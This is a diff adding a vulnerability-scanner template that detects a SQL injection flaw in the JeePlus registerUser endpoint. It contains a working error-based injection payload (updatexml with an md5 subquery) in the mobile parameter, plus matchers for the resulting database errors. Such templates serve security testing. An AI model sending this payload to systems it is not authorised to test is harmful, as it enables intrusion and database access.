@@ -1,0 +1,32 @@
+id: jeeplus-registeruser-sqli
+info:
+  name: JeePlus registerUser SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+
+variables:
+  t1: "{{rand_int(1000, 10000)}}"
+  t2: "{{md5(t1)}}"
+
+http:
+  - method: GET
+    path:
+      - "/a/sys/register/registerUser?roleName=wangba&mobile=13300990099'and+(updatexml(1,concat(0x7e,(select+md5({{t1}})),0x7e),1))%23&randomCode=2131&loginName=test1&password=123123&confirmNewPassword=123123&ck1=on"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        words:
+          - "XPATH syntax error"
+        part: body
+      - type: word
+        words:
+          - "Error querying database"
+        part: body
+      - type: word
+        words:
+          - "{{substr(t2, 0, 31)}}"
+        part: body
